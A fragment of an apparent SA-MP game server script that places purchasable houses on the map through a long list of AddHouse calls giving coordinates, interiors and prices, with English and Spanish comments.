	AddHouse(1623, 1623.230468, 2567.346679, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1624);//Big house
	AddHouse(1624, 1535.106201, 2610.028808, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1625); //A small house ;)
	AddHouse(1625, 1554.565307, 2610.715576, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1626); //A small house ;)
	AddHouse(1626, 1600.429321, 2610.022216, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1627); //A small house ;)
	AddHouse(1627, 1618.750854, 2610.030517, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1628); //A small house ;)
	AddHouse(1628, 1638.161865, 2610.708007, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1629); //A small house ;)
	AddHouse(1629, 1666.889404, 2610.173095, 11.298933, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1630); //A small house ;)
	AddHouse(1630, 1665.622192, 2569.429687, 11.298933, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1631); //A small house ;)
	AddHouse(1631, 1646.375000, 2569.590332, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1632); //A small house ;)
	AddHouse(1632, 1792.845947, 2587.640625, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1633); //A small house ;)
	AddHouse(1633, 1811.269165, 2587.643554, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1634); //A small house ;)
	AddHouse(1634, 1829.794311, 2587.655517, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1635); //A small house ;)
	AddHouse(1635, 1868.461059, 2582.982666, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1636); //A small house ;)
	AddHouse(1636, 1887.134887, 2582.985351, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1637); //A small house ;)
	AddHouse(1637, 1962.806396, 2608.243408, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1638); //A small house ;)
	AddHouse(1638, 1944.418823, 2608.243408, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1639); //A small house ;)
	AddHouse(1639, 1925.756591, 2608.241943, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1640); //A small house ;)
	AddHouse(1640, 1907.351562, 2608.227050, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1641); //A small house ;)
	AddHouse(1641, 1800.819335, 2657.190917, 10.812578, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1642); //A small house ;)
	AddHouse(1642, 1800.816406, 2638.677734, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1643); //A small house ;)
	AddHouse(1643, 1825.715087, 2649.173828, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1644); //A small house ;)
	AddHouse(1644, 1844.065551, 2649.164794, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1645); //A small house ;)
	AddHouse(1645, 1862.659545, 2649.169189, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1646); //A small house ;)
	AddHouse(1646, 1881.448730, 2649.168457, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1647); //A small house ;)
	AddHouse(1647, 1556.183227, 2658.521484, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1648); //A small house ;)
	AddHouse(1648, 1572.831176, 2657.851074, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1649); //A small house ;)
	AddHouse(1649, 1607.602294, 2679.521484, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1650); //A small house ;)
	AddHouse(1650, 1611.754028, 2648.443115, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1651);//Big house
	AddHouse(1651, 1570.285400, 2711.147216, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1652);//Big house
	AddHouse(1652, 1580.276855, 2708.853759, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1653);//Big house
	AddHouse(1653, 1601.187866, 2708.855712, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1654);//Big house
	AddHouse(1654, 1627.149291, 2710.773925, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1655);//Big house
	AddHouse(1655, 1652.474243, 2708.855712, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1656);//Big house
	AddHouse(1656, 1678.658203, 2690.762207, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1657);//Big house
	AddHouse(1657, 1703.415771, 2689.091552, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1658);//Big house
	AddHouse(1658, 1735.702758, 2691.111572, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1659);//Big house
	AddHouse(1659, 1599.835205, 2757.458496, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1660);//Big house
	AddHouse(1660, 1608.536010, 2753.250732, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1661); //A small house ;)
	AddHouse(1661, 1626.731079, 2753.937744, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1662); //A small house ;)
	AddHouse(1662, 1643.900268, 2753.440917, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1663); //A small house ;)
	AddHouse(1663, 1663.230468, 2754.134277, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1664); //A small house ;)
	AddHouse(1664, 1673.083129, 2800.820556, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1665); //A small house ;)
	AddHouse(1665, 1654.899536, 2800.814941, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1666); //A small house ;)
	AddHouse(1666, 1637.885009, 2801.510742, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1667); //A small house ;)
	AddHouse(1667, 1618.356323, 2800.815429, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1668); //A small house ;)
	AddHouse(1668, 1565.193481, 2793.595947, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1669); //A small house ;)
	AddHouse(1669, 1564.755249, 2776.383789, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1670); //A small house ;)
	AddHouse(1670, 1565.462402, 2757.120605, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1671); //A small house ;)
	AddHouse(1671, 1588.457763, 2797.330322, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1672);//Big house
	AddHouse(1672, 1664.624633, 2846.076416, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1673);//Big house
	AddHouse(1673, 1632.824096, 2843.627929, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1674);//Big house
	AddHouse(1674, 1622.816040, 2846.076416, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1675);//Big house
	AddHouse(1675, 1601.678955, 2845.870361, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1676);//Big house
	AddHouse(1676, 1575.623413, 2844.004150, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1677);//Big house
	AddHouse(1677, 1550.592041, 2846.076904, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1678);//Big house
	AddHouse(1678, 1931.570556, 2721.266113, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1679); //A small house ;)
	AddHouse(1679, 1950.686767, 2721.951660, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1680); //A small house ;)
	AddHouse(1680, 1970.130371, 2721.781250, 11.298933, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1681); //A small house ;)
	AddHouse(1681, 1998.449096, 2721.261230, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1682); //A small house ;)
	AddHouse(1682, 2018.044189, 2721.962402, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1683); //A small house ;)
	AddHouse(1683, 2066.096435, 2721.449218, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1684); //A small house ;)
	AddHouse(1684, 2049.704345, 2764.287597, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1685);//Big house
	AddHouse(1685, 2039.391723, 2766.395263, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1686);//Big house
	AddHouse(1686, 2018.343505, 2766.546630, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1687);//Big house
	AddHouse(1687, 1992.524780, 2764.634033, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1688);//Big house
	AddHouse(1688, 1967.414184, 2766.546630, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1689);//Big house
	AddHouse(1689, 1929.632812, 2774.486328, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1690);//Big house
	AddHouse(1690, 1921.411499, 2664.418945, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1691); //A small house ;)
	AddHouse(1691, 1950.528930, 2664.656982, 11.298933, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1692); //A small house ;)
	AddHouse(1692, 1969.457275, 2664.491455, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1693); //A small house ;)
	AddHouse(1693, 1989.122314, 2665.193847, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1694); //A small house ;)
	AddHouse(1694, 2017.841796, 2664.654296, 11.298933, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1695); //A small house ;)
	AddHouse(1695, 2037.070556, 2664.504150, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1696); //A small house ;)
	AddHouse(1696, 2056.590576, 2664.056884, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1697); //A small house ;)
	AddHouse(1697, 1464.510253, 1895.067626, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1698); //A small house ;)
	AddHouse(1698, 1464.510009, 1919.959106, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1699); //A small house ;)
	AddHouse(1699, 1462.185668, 1949.808471, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1700); //A small house ;)
	AddHouse(1700, 1439.819213, 1951.259765, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1701); //A small house ;)
	AddHouse(1701, 1412.610717, 1951.251342, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1702); //A small house ;)
	AddHouse(1702, 1409.360839, 1920.196411, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1703); //A small house ;)
	AddHouse(1703, 1364.507812, 1896.654296, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1704); //A small house ;)
	AddHouse(1704, 1363.980834, 1931.552612, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1705); //A small house ;)
	AddHouse(1705, 1336.282470, 1931.251831, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1706); //A small house ;)
	AddHouse(1706, 1309.266601, 1931.252929, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1707); //A small house ;)
	AddHouse(1707, 1320.210327, 1976.080200, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1708); //A small house ;)
	AddHouse(1708, 1319.299926, 2005.707641, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1709); //A small house ;)
	AddHouse(1709, 1320.738037, 2028.102172, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1710); //A small house ;)
	AddHouse(1710, 1365.423828, 2027.909912, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1711); //A small house ;)
	AddHouse(1711, 1364.389648, 2003.548706, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1712); //A small house ;)
	AddHouse(1712, 1365.648071, 1974.494018, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1713); //A small house ;)
	AddHouse(1713, 1554.301269, 2074.051513, 11.359375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1714); //A small house ;)
	AddHouse(1714, 1550.266723, 2096.296630, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1715); //A small house ;)
	AddHouse(1715, 1549.354614, 2125.832519, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1716); //A small house ;)
	AddHouse(1716, 1596.407958, 2147.479003, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1717); //A small house ;)
	AddHouse(1717, 1595.502563, 2123.242431, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1718); //A small house ;)
	AddHouse(1718, 1596.406860, 2093.704101, 11.312500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1719); //A small house ;)
	AddHouse(1719, 1594.964111, 2070.942138, 11.319854, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1720); //A small house ;)
	AddHouse(1720, 1595.499877, 2038.634277, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1721); //A small house ;)
	AddHouse(1721, 1641.793945, 2045.070678, 11.319854, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1722); //A small house ;)
	AddHouse(1722, 1640.348754, 2075.642089, 11.312500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1723); //A small house ;)
	AddHouse(1723, 1640.351318, 2102.996093, 11.312500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1724); //A small house ;)
	AddHouse(1724, 1645.551391, 2127.383789, 11.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1725); //A small house ;)
	AddHouse(1725, 1641.258911, 2149.827392, 11.312500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1726); //A small house ;)
	AddHouse(1726, 1684.507690, 2123.326416, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1727); //A small house ;)
	AddHouse(1727, 1685.414062, 2093.669677, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1728); //A small house ;)
	AddHouse(1728, 1680.187255, 2069.234619, 11.359375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1729); //A small house ;)
	AddHouse(1729, 1684.506469, 2046.531494, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1730); //A small house ;)
	AddHouse(1730, 252.979187, -1269.723266, 74.271430, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1731);//Big house
	AddHouse(1731, 219.664123, -1250.275024, 78.333145, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1732);//Big house
	AddHouse(1732, 470.707519, -1163.577514, 67.217742, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1733);//Big house
 	AddHouse(1733, 559.205871, -1160.835327, 54.429687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1734); //A small house ;)
	AddHouse(1734, 646.090698, -1117.318359, 44.207038, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1735);//Big house
	AddHouse(1735, 700.030029, -1060.214233, 49.421691, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1736);//Big house
	AddHouse(1736, 352.344177, -1197.760375, 76.515625, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1737);//Big house
	AddHouse(1737, 417.333923, -1154.839599, 76.687614, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1738); //A small house ;)
	AddHouse(1738, 558.519531, -1076.568115, 72.921989, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1739); //A small house ;)
	AddHouse(1739, 498.067810, -1094.010498, 82.359191, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1740);//Big house
	AddHouse(1740, 189.647750, -1308.293334, 70.249465, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1741);//Big house
	AddHouse(1741, 431.774566, -1253.169921, 51.580940, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1742); //A small house ;)
	AddHouse(1742, 552.506042, -1200.444580, 44.831535, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1743); //A small house ;)
	AddHouse(1743, 724.702880, -999.368041, 52.734375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1744); //A small house ;)
	AddHouse(1744, 808.364990, -759.743103, 76.531364, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1745); //A small house ;)
	AddHouse(1745, 848.235290, -745.531372, 94.969268, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1746); //A small house ;)
	AddHouse(1746, 891.152954, -783.160461, 101.313621, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1747);//Big house
	AddHouse(1747, 867.592712, -717.264709, 105.679687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1748); //A small house ;)
	AddHouse(1748, 1442.638793, -629.947937, 95.718566, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1749);//Big house
	AddHouse(1749, 1034.542480, -812.390441, 101.851562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1750); //A small house ;)
	AddHouse(1750, -207.866912, 1119.336303, 20.429687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1751);//Big house
	AddHouse(1751, 300.123992, 1141.205566, 9.137485, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1752); //A small house ;)
	AddHouse(1752, 397.350860, 1157.608032, 8.348056, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1753); //A small house ;)
	AddHouse(1753, 500.838806, 1116.282714, 15.035557, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1754); //A small house ;)
	AddHouse(1754, 709.903137, 1194.609008, 13.396438, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1755); //A small house ;)
	AddHouse(1755, 710.485290, 1208.050537, 13.848057, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1756); //A small house ;)
	AddHouse(1756, -2324.784912, -1628.844726, 483.703155, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1757); //Mansion
	AddHouse(1757, -83.474937, -2.441935, 3.117187, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1758); //Mansion
	AddHouse(1758, -328.312408, 1533.380371, 75.356956, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1759);//Medium House
	AddHouse(1759, -15.017331, -1647.234252, 10.994065, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1760); //Mansion
	AddHouse(1760, -1466.939086, 1981.715576, 48.354984, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1761); //Casa pequeña ;)
	AddHouse(1761, -1499.961791, 1960.548583, 49.023437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1762); //Casa pequeña ;)
	AddHouse(1762, 2973.507324, -2038.927246, 4.895436, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1763); //Casa pequeña ;)
	AddHouse(1763, 2962.660400, -2085.154052, 5.056052, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1764);//Casa mediana
	AddHouse(1764, 3001.317626, -2039.989013, 4.898754, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1765);//Casa mediana
	AddHouse(1765, 2999.557861, -2073.134765, 3.554271, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1766); //Casa pequeña ;)
	AddHouse(1766, 1298.536254, -799.219665, 84.140625, 1299.14, -794.77, 1084.00, 10000000, 9000000, 5, 1767); //Mansion
    AddHouse(1767, 2495.235595, -1690.738647, 14.765625, 2496.65, -1696.55, 1014.74, 500000, 400000, 3, 1768);//Casa grande
    AddHouse(1768, -1353.549926, 2057.554199, 53.117187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1769); //Casa pequeña ;)
    AddHouse(1769, -1426.771972, 2170.619873, 50.625000, 225.79, 1025.77, 1084.00, 50000, 49000, 7, 1770); //Mansion ;)
    AddHouse(1770, -795.955078, 2259.071289, 59.476562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1771); //Casa pequeña ;)
    AddHouse(1771, 3026.140136, -2069.895507, 3.872812, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1772);//Casa mediana
    AddHouse(1772, 3030.289550, -2033.713378, 4.557200, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1773);//Casa mediana
    AddHouse(1773, 3037.997558, -2034.233886, 4.557200, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1774);//Casa mediana
    AddHouse(1774, 3042.939697, -2067.808105, 3.893514, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1775); //Casa pequeña ;)
    AddHouse(1775, 3058.992919, -2067.806396, 3.556771, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1776);//Casa mediana
    AddHouse(1776, 3067.734863, -2067.882080, 3.556771, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1777);//Casa mediana
    AddHouse(1777, 3071.195312, -2039.015502, 4.374630, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1778);//Casa grande
    AddHouse(1778, 3093.410156, -2076.458740, 5.057187, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1779);//Casa grande
    AddHouse(1779, 3109.898193, -2035.101562, 4.553475, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1780);//Casa mediana
    AddHouse(1780, 3126.901611, -2063.272216, 3.556771, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1781); //Casa pequeña ;)
    AddHouse(1781, 3129.446533, -2035.870117, 4.529373, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1782); //Casa pequeña ;)
    AddHouse(1782, 3151.125488, -2033.260620, 4.357565, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1783); //Casa pequeña ;)
    AddHouse(1783, 3142.017089, -2071.179931, 5.868659, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1784);//Casa mediana
    AddHouse(1784, 3173.436279, -2065.007812, 3.740102, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1785); //Casa pequeña ;)
    AddHouse(1785, 3173.069091, -2034.042602, 4.341715, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1786); //Casa pequeña ;)
    AddHouse(1786, 3196.358642, -2034.465087, 4.592245, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1787); //Casa pequeña ;)
    AddHouse(1787, 2927.038330, -2029.087524, 4.130571, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1788); //Casa pequeña ;)
    AddHouse(1788, 2932.459228, -2072.447509, 3.554271, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1789);//Casa mediana
    AddHouse(1789, 79.558242, -1804.957031, 4.665568, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1790); //Mansion
    AddHouse(1790, 3808.354248, -601.532104, 21.700107, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1791); //Casa pequeña ;)
    AddHouse(1791, 3752.727294, -611.223449, 5.344242, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1792);//Casa mediana
    AddHouse(1792, 263.297637, 2895.797119, 10.531394, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1793); //Casa pequeña ;)
    AddHouse(1793, 245.999603, 2981.311767, 2.908443, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1794); //Mansion
    AddHouse(1794, -12.634228, 2346.523681, 24.140625, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1795); //Casa pequeña ;)
    AddHouse(1795, 217.909469, -1982.769042, 2.237901, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1796); //Mansion
    AddHouse(1796, 775.155517, -2850.314208, 5.609547, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1797);//Casa grande
    AddHouse(1797, 24.088996, -2646.506103, 40.463680, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1798); //Casa pequeña ;)
	AddHouse(1798, -283.258544, -2174.708007, 28.665819, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1799);//Casa mediana
	AddHouse(1799, -256.482116, -2191.536376, 28.993484, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1800);//Casa mediana
	AddHouse(1800, -347.851715, -1046.713256, 59.812500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1801); //Casa pequeña ;)
	AddHouse(1801, 186.849685, 562.436767, 4.237812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1802);//Casa grande
	AddHouse(1802, -2892.678955, -51.669067, 7.039278, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1803);//Casa grande
	AddHouse(1803, -2875.765869, -46.996982, 7.004687, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1804);//Casa grande
	AddHouse(1804, -2099.080566, 2890.307128, 73.173660, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1805);//Casa mediana
	AddHouse(1805, 983.248657, -2161.716308, 15.129927, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1806); //Mansion
	AddHouse(1806, 153.844345, 572.630004, 2.857812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1807);//Casa grande
	AddHouse(1807, 1107.571044, -316.281585, 74.742187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1808); //Casa pequeña ;)
	AddHouse(1808, 1106.044189, -299.720672, 74.539062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1809); //Casa pequeña ;)
	AddHouse(1809, -1666.813720, 2486.300292, 87.162521, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1810); //Casa pequeña ;)
	AddHouse(1810, -1670.042236, 2545.799560, 85.231971, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1811); //Casa pequeña ;)
	AddHouse(1811, -1669.590454, 2597.912841, 81.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1812); //Casa pequeña ;)
	AddHouse(1812, -672.945556, 2706.140136, 70.663284, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1813); //Casa pequeña ;)
	AddHouse(1813, -624.879638, 2709.999023, 72.375000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1814); //Casa pequeña ;)
	AddHouse(1814, -604.499206, 2716.689453, 72.723060, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1815); //Casa pequeña ;)
	AddHouse(1815, -582.275024, 2712.905029, 71.839942, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1816); //Casa pequeña ;)
	AddHouse(1816, 2351.404296, -652.393310, 128.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1817); //Casa pequeña ;)
	AddHouse(1817, -2057.956054, -2465.165771, 31.179687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1818); //Casa pequeña ;)
	AddHouse(1818, -3373.973144, -2678.050781, 64.791084, 222.98, 1239.83, 1082.14, 75000, 74000, 2, 1819); //Casa pequeña ;)
	AddHouse(1819, -1521.010498, 326.166229, 53.460937, 225.79, 1025.77, 1084.00, 1000000, 990000, 7, 1820); //Mansion
	AddHouse(1820, -1431.939453, 372.876495, 30.128400, 225.79, 1025.77, 1084.00, 1000000, 990000, 7, 1821); //Mansion
	AddHouse(1821, -1398.911865, 422.468444, 30.753847, 225.79, 1025.77, 1084.00, 500000, 490000, 7, 1822); //Mansion
	AddHouse(1822, -1466.939208, 422.873260, 30.753847, 225.79, 1025.77, 1084.00, 500000, 490000, 7, 1823); //Mansion
	AddHouse(1823, -1501.830322, 442.166717, 43.057640, 235.30, 1190.04, 1080.25, 200000, 190000, 3, 1824);//Casa grande
	AddHouse(1824, -1509.495727, 442.167877, 43.057640, 235.30, 1190.04, 1080.25, 200000, 190000, 3, 1825);//Casa grande
	AddHouse(1825, 481.632141, -1815.430664, 6.318375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1826); //Casa pequeña ;)
	AddHouse(1826, 939.133117, -1940.934936, 5.199999, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1827);//Casa mediana
	AddHouse(1827, -1423.636474, -958.921386, 200.802459, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1828);//Casa mediana
	AddHouse(1828, 710.816650, -2716.750488, 12.207812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1829);//Casa grande
	AddHouse(1829, 3040.326660, 348.349487, 5.609372, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1830);//Casa grande
	AddHouse(1830, -337.263366, -845.792785, 47.618103, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1831); //Casa pequeña ;)
	AddHouse(1831, -803.404968, -851.613464, 149.307815, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1832); //Casa pequeña ;)
	AddHouse(1832, -3142.416503, -479.625305, 2.672826, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1833); //Mansion
	AddHouse(1833, -2544.628906, -849.925781, 11.021322, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1834);//Casa grande
	AddHouse(1834, 317.292663, -2486.869873, 17.737342, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1835); //Mansion
	AddHouse(1835, -418.284515, -1749.389160, 7.174077, 295.28, 1473.01, 1080.25, 100000, 90000, 15, 1836);//Casa mediana
	AddHouse(1836, 3231.000732, -1582.569091, 25.605682, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1837); //Casa pequeña ;)
	AddHouse(1837, 3194.726806, -1627.655883, 12.497951, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1838); //Casa pequeña ;)
